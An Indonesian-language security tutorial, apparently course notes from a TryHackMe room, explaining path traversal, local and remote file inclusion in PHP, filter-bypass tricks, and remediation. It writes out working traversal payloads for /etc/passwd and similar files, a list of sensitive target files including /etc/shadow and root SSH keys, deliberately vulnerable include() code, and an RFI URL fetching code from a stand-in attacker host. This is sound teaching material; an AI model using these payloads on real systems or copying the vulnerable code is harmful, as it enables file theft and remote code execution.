# File Inclusion

## Introduction

### What is File Inclusion?

Dalam beberapa skenario, aplikasi web ditulis untuk meminta akses ke file pada sistem tertentu, termasuk gambar, teks statis, dan sebagainya melalui parameter. Parameter adalah string parameter kueri yang dilampirkan ke URL yang dapat digunakan untuk mengambil data atau melakukan tindakan berdasarkan input pengguna. Grafik berikut menjelaskan dan merinci bagian-bagian penting dari URL.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png)

Sebagai contoh, parameter yang digunakan saat searching Google menggunakan `GET` sehingga url tampak sebagai berikut: `https://www.google.com/search?q=your_keyword`.

Mari kita bahas skenario di mana pengguna meminta untuk mengakses file dari server web. Pertama, pengguna mengirimkan permintaan HTTP ke server web yang menyertakan file untuk ditampilkan. Misalnya, jika pengguna ingin mengakses dan menampilkan CV mereka dalam aplikasi web, permintaannya mungkin terlihat sebagai berikut, `http://webapp.thm/get.php?file=userCV.pdf`, di mana `file` adalah parameter dan `userCV.pdf`, adalah file yang diperlukan untuk mengakses.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png)

### Why do File Inclusion Vulnerabilities Happen?

File Inclusion Vulnerabilities biasanya ditemukan dan dieksploitasi dalam berbagai bahasa pemrograman untuk aplikasi web, seperti PHP yang ditulis dan diimplementasikan dengan buruk. Masalah utama dari kerentanan ini adalah validasi input, di mana input pengguna tidak disanitasi atau divalidasi, dan pengguna mengontrolnya. Ketika input tidak divalidasi, pengguna dapat meneruskan input apa pun ke fungsi, yang menyebabkan kerentanan.

### What is the Risk of File Inclusion

Tergantung. Jika penyerang dapat menggunakan kerentanan inklusi file untuk membaca data sensitif. Dalam hal ini, serangan yang berhasil menyebabkan kebocoran data sensitif, termasuk kode dan file yang terkait dengan aplikasi web, kredensial untuk sistem back-end. Selain itu, jika penyerang entah bagaimana dapat menulis ke server seperti direktori `/tmp`, maka dimungkinkan untuk mendapatkan eksekusi perintah jarak jauh RCE. Namun, itu tidak akan efektif jika kerentanan penyertaan file ditemukan tanpa akses ke data sensitif dan tidak ada kemampuan menulis ke server.

## Path Traversal

Juga dikenal sebagai `Directory Traversal`, kerentanan keamanan web memungkinkan penyerang membaca sumber daya sistem operasi, seperti file lokal di server yang menjalankan aplikasi. Penyerang mengeksploitasi kerentanan ini dengan memanipulasi dan menyalahgunakan URL aplikasi web untuk mencari dan mengakses file atau direktori yang disimpan di luar direktori root aplikasi.

Kerentanan Path Traversal terjadi ketika input pengguna diteruskan ke fungsi seperti `file_get_contents` di PHP. Penting untuk dicatat bahwa fungsi bukanlah kontributor utama kerentanan. Seringkali validasi atau pemfilteran input yang buruk adalah penyebab kerentanan. Di PHP, Anda dapat menggunakan `file_get_contents` untuk membaca konten file.

Grafik berikut menunjukkan bagaimana aplikasi web menyimpan file di `/var/www/app`. Jalur bahagia adalah pengguna yang meminta konten `userCV.pdf` dari jalur yang ditentukan `/var/www/app/CVs`.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/45d9c1baacda290c1f95858e27f740c9.png)

Kita dapat menguji parameter URL dengan menambahkan muatan untuk melihat bagaimana aplikasi web berperilaku. Serangan Path Traversal, juga dikenal sebagai serangan dot-dot-slash, memanfaatkan pemindahan direktori satu langkah ke atas menggunakan titik ganda `../.` Jika penyerang menemukan titik masuk, yang dalam hal ini `get.php?file=`, penyerang dapat mengirimkan sesuatu sebagai berikut, `http://webapp.thm/get.php?file=../../.. /../etc/passwd`.

Misalkan tidak ada validasi input, dan alih-alih mengakses file PDF di lokasi `/var/www/app/CVs`, aplikasi web mengambil file dari direktori lain, yang dalam hal ini `/etc/passwd`. Setiap entri `..` berpindah satu direktori hingga mencapai direktori `root /`. Kemudian ia mengubah direktori ke `/etc`, dan dari sana, ia membaca file passwd.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png)

Sebagai response, aplikasi web mengirimkan kembali konten file ke pengguna.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png)

Demikian pula, jika aplikasi web berjalan di server Windows, penyerang perlu menyediakan jalur Windows. Misalnya, jika penyerang ingin membaca file boot.ini yang terletak di `c:\boot.ini`, maka penyerang dapat mencoba yang berikut ini tergantung pada versi OS target:

`http://webapp.thm/get.php?file=../../../../boot.ini` atau <br>
`http://webapp.thm/get.php?file=../../../../windows/win.ini`

Konsep yang sama berlaku di sini seperti halnya dengan sistem operasi Linux, di mana kita memanjat direktori hingga mencapai direktori root, yang biasanya `c:\`.

Dibawah ini adalah File pada OS yang umum untuk di-testing.
| Location | Description |
| -------- | ----------- |
| `/etc/issue` | berisi pesan atau identifikasi sistem yang akan dicetak sebelum prompt login |
| `/etc/profile` | mengontrol variabel default di seluruh sistem, seperti variabel Ekspor, Mask pembuatan file (umask), Jenis terminal, Pesan email untuk menunjukkan saat email baru tiba |
| `/proc/version` | menentukan versi kernel linux |
| `/etc/passwd` | memiliki semua user yang memiliki akses ke sistem |
| `/etc/shadow` | berisi informasi tentang kata sandi pengguna sistem |
| `/root/.bash_history` | berisi riwayat command untuk pengguna `root` |
| `/var/log/dmessage` | berisi pesan sistem global, termasuk pesan yang dicatat selama startup sistem |
| `/var/mail/root` | semua email untuk user `root` |
| `/root/.ssh/id_rsa` | Kunci SSH pribadi untuk root atau pengguna valid yang diketahui di server |
| `/var/log/apache2/access.log` | permintaan akses untuk server web `Apache` |
| `C:\boot.ini` | berisi opsi boot untuk komputer dengan firmware BIOS |

## Local File Inclusion - LFI

Serangan LFI terhadap aplikasi web sering kali disebabkan oleh kurangnya kesadaran keamanan developer. Dengan `PHP`, menggunakan fungsi seperti `include`, `require`, `include_once`, dan `require_once` sering kali berkontribusi pada aplikasi web yang rentan. Pada kali ini, kita akan memilih `PHP`, tetapi perlu dicatat bahwa kerentanan LFI juga terjadi saat menggunakan bahasa lain seperti `ASP`, `JSP`, atau bahkan di aplikasi `Node.js`. Eksploitasi LFI mengikuti konsep yang sama dengan Path Traversal.

1. Misalkan aplikasi web menyediakan dua bahasa, dan pengguna dapat memilih antara `EN` dan `AR`
```php
<?php 
	include($_GET["lang"]);
?>
```
Kode `PHP` di atas menggunakan permintaan `GET` melalui parameter URL `lang` untuk menyertakan file halaman. Panggilan dapat dilakukan dengan mengirimkan permintaan HTTP berikut sebagai berikut:` http://webapp.thm/index.php?lang=EN.php` untuk memuat halaman bahasa Inggris atau `http://webapp.thm/index.php?lang=AR.php` untuk memuat halaman bahasa Arab, di mana file `EN.php` dan `AR.php` ada di direktori yang sama.

Secara teoritis, kita dapat mengakses dan menampilkan file yang dapat dibaca di server dari kode di atas jika tidak ada validasi input. Katakanlah kita ingin membaca file `/etc/passwd`, yang berisi informasi sensitif tentang pengguna sistem operasi Linux, kita dapat mencoba yang berikut: `http://webapp.thm/get.php?file=/etc/passwd`.

Dalam kasus ini, ini berfungsi karena tidak ada direktori yang ditentukan dalam fungsi `include` dan tidak ada validasi input.

2. Selanjutnya, dalam kode berikut, developer memutuskan untuk menentukan direktori di dalam fungsi.
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
Dalam kode di atas, developer memutuskan untuk menggunakan fungsi `include` untuk memanggil halaman `PHP` di direktori bahasa hanya melalui parameter `lang`.

Jika tidak ada validasi input, penyerang dapat memanipulasi URL dengan mengganti input `lang` dengan file sensitif OS lainnya seperti `/etc/passwd`.

Sekali lagi payload terlihat mirip dengan path traversal, tetapi fungsi `include` memungkinkan kita untuk memasukkan file yang dipanggil ke halaman saat ini. Berikut ini akan menjadi eksploit:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

## Local File Inclusion - LFI # 2 

Kita masuk sedikit lebih dalam ke LFI. kita membahas beberapa teknik untuk melewati filter dalam fungsi `include`.

1. Dalam dua kasus pertama, kita memeriksa kode untuk aplikasi web, dan kemudian kita tahu cara mengeksploitasinya. Namun, dalam kasus ini, kita melakukan black box testing, di mana kita tidak memiliki kode sumbernya. Dalam hal ini, kesalahan signifikan dalam memahami bagaimana data dilewatkan dan diproses ke dalam aplikasi web.

Dalam skenario ini, kita memiliki titik masuk berikut: `http://webapp.thm/index.php?lang=EN`. Jika kita memasukkan input yang tidak valid, seperti THM, kita mendapatkan kesalahan berikut:
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

Pesan kesalahan mengungkapkan informasi penting. Dengan memasukkan THM sebagai input, pesan kesalahan menunjukkan seperti apa fungsi include:` include(languages/THM.php);`.

Jika kita melihat direktori dengan cermat, kita dapat mengetahui bahwa fungsi `include files` dalam direktori bahasa adalah menambahkan `.php` di akhir entri. Jadi input yang valid akan menjadi sesuatu sebagai berikut: `index.php?lang=EN`, di mana file `EN` terletak di dalam direktori bahasa yang diberikan dan bernama `EN.php`.

Juga, pesan kesalahan mengungkapkan informasi penting lainnya tentang jalur direktori aplikasi web lengkap yaitu `/var/www/html/THM-4/`

Untuk mengeksploitasi ini, kita perlu menggunakan trik` ../`, seperti yang dijelaskan di bagian traversal direktori, untuk keluar dari folder saat ini. Mari kita coba yang berikut ini:

`http://webapp.thm/index.php?lang=../../../../etc/passwd`

Perhatikan bahwa kita menggunakan 4 `../` karena kita tahu path memiliki empat level `/var/www/html/THM-4`. Tetapi kita masih menerima kesalahan berikut:
```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
Sepertinya kita bisa keluar dari direktori `PHP` tapi tetap saja, fungsi include membaca input dengan `.php` di akhir! Ini memberitahu kita bahwa pengembang menentukan jenis file untuk diteruskan ke fungsi `include`. Untuk melewati skenario ini, kita dapat menggunakan `NULL BYTE`, yaitu `%00`.

Menggunakan null byte adalah teknik injeksi di mana representasi yang disandikan URL seperti `%00` atau `0x00` dalam hex dengan data yang disediakan pengguna untuk menghentikan string. Anda dapat menganggapnya sebagai mencoba mengelabui aplikasi web agar mengabaikan apa pun yang muncul setelah Null Byte.

Dengan menambahkan Null Byte di akhir payload, kami memberi tahu fungsi include untuk mengabaikan apa pun setelah byte nol yang mungkin terlihat seperti:
`include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");`

Notes: trik `%00` telah diperbaiki dan tidak berfungsi pada `PHP 5.3.4` keatas.

2. Di bagian ini, developer memutuskan untuk memfilter kata kunci untuk menghindari pengungkapan informasi sensitif. File `/etc/passwd` sedang difilter. Ada dua metode yang mungkin untuk melewati filter. Pertama, dengan menggunakan `NullByte %00` atau trik direktori saat ini di akhir kata kunci yang difilter `/..` Eksploitasi akan mirip dengan `http://webapp.thm/index.php?lang=/etc/passwd/`. Kita juga dapat menggunakan `http://webapp.thm/index.php?lang=/etc/passwd%00`.

Untuk membuatnya lebih jelas, jika kita mencoba konsep ini di sistem file menggunakan `cd ..`, itu akan membuat kita mundur satu langkah, namun, jika Anda melakukan `cd .`, Itu tetap berada di direktori saat ini. Demikian pula, jika kita mencoba `/etc/passwd/..`, hasilnya menjadi `/etc/` dan itu karena kita memindahkan satu ke root. Sekarang jika kita mencoba `/etc/passwd/.`, hasilnya akan menjadi `/etc/passwd` karena titik merujuk ke direktori saat ini.

3. Selanjutnya, dalam skenario berikut, dev mulai menggunakan validasi input dengan memfilter beberapa kata kunci.

http://webapp.thm/index.php?lang=../../../../etc/passwd

Jika kita memasukkan payload diatas, maka akan mendapatkan error:
```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
Jika kita memeriksa pesan error di bagian `include(languages/etc/passwd)`, kita tahu bahwa aplikasi web mengganti `../` dengan string kosong. Ada teknik yang dapat kita gunakan untuk melewati ini:

- Menggandakan slash dan dot `..//`. Contoh `....//....//....//....//....//etc/passwd`.

    Ini berfungsi karena filter `PHP` hanya mencocokkan dan menggantikan string subset pertama `../` yang ditemukan dan tidak melakukan pass lain, meninggalkan apa yang digambarkan di bawah ini.
    ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png)

4. Terakhir, kita akan membahas kasus di mana dev memaksa penyertaan untuk membaca dari direktori yang ditentukan. Misalnya, jika aplikasi web meminta untuk memberikan input yang harus menyertakan direktori seperti: `http://webapp.thm/index.php?lang=languages/EN.php` maka, untuk mengeksploitasi ini, kita perlu menyertakan direktori di payload seperti: `?lang=languages/../../../../../etc/passwd`.

## Remote File Inclusion - RFI

Remote File Inclusion (RFI) adalah teknik untuk memasukkan file jarak jauh dan ke dalam aplikasi yang rentan. Seperti LFI, RFI terjadi ketika membersihkan input pengguna secara tidak benar, memungkinkan penyerang untuk menyuntikkan URL eksternal ke dalam fungsi `include`. Salah satu persyaratan untuk RFI adalah bahwa opsi `allow_url_fopen` harus diaktifkan.

Risiko RFI lebih tinggi daripada LFI karena kerentanan RFI memungkinkan penyerang mendapatkan Remote Command Execution (RCE) di server. Konsekuensi lain dari serangan RFI yang berhasil meliputi:

- Keterbukaan Informasi Sensitif
- Cross-site Scription (XSS)
- Denial of Service (DoS)

Server eksternal harus berkomunikasi dengan server aplikasi untuk serangan RFI yang berhasil di mana penyerang menghosting file berbahaya di server mereka. Kemudian file berbahaya disuntikkan ke dalam fungsi include melalui permintaan HTTP, dan konten file berbahaya dijalankan di server aplikasi yang rentan.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)

### RFI Steps

Gambar berikut adalah contoh langkah-langkah serangan RFI yang berhasil. Katakanlah penyerang menghosting file `PHP` di server mereka sendiri `http://attacker.thm/cmd.txt` di mana `cmd.txt` berisi pesan pencetakan `Hello THM`.
```php
<?PHP echo "Hello THM"; ?>
```
Pertama, penyerang menyuntikkan URL berbahaya, yang mengarah ke server penyerang, seperti `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. Jika tidak ada validasi input, maka URL berbahaya masuk ke fungsi `include`. Selanjutnya, server aplikasi web akan mengirim permintaan `GET` ke server jahat untuk mengambil file. Akibatnya, aplikasi web menyertakan file jarak jauh ke dalam fungsi `include` untuk mengeksekusi file `PHP` di dalam halaman dan mengirim konten eksekusi ke penyerang. Dalam kasus kita, halaman saat ini di suatu tempat harus menampilkan pesan `Hello THM`.

## Remediation
Sebagai developer, penting untuk mengetahui kerentanan aplikasi web, cara menemukannya, dan metode pencegahan. Untuk mencegah kerentanan penyertaan file, beberapa saran umum meliputi:

- Menjaga sistem dan layanan, termasuk framework aplikasi web, diperbarui dengan versi terbaru.
- Matikan kesalahan `PHP` untuk menghindari kebocoran jalur aplikasi dan informasi lain yang berpotensi mengungkapkan.
- Web Application Firewall (WAF) adalah pilihan yang baik untuk membantu mengurangi serangan aplikasi web.
- Nonaktifkan beberapa fitur `PHP` yang menyebabkan kerentanan penyertaan file jika aplikasi web Anda tidak membutuhkannya, seperti `allow_url_fopen` dan `allow_url_include`.
- Analisis aplikasi web dengan cermat dan izinkan hanya protokol dan pembungkus `PHP` yang diperlukan.
- Jangan pernah mempercayai input pengguna, dan pastikan untuk menerapkan validasi input yang tepat terhadap penyertaan file.
- Menerapkan whitelisting untuk nama file dan lokasi begitu pula blacklist-nya.
